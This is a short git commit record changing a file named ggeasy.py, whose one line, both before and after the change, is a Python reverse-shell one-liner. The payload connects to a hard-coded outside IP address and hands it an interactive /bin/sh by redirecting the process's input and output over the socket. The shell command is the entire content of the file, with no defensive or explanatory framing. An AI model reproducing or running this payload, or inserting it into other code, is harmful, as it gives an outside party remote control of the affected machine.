e49e651261e6bf712f36f0cb3d9f1c57dc0f9718
ZemarKhos <zshadow@protonmail.ch>
2020-05-11 21:51:02 -0400

    Update ggeasy.py

--- ggeasy.py
+++ ggeasy.py
@@ -1,1 +1,1 @@
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("193.192.127.252",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+-c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("193.192.127.252",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
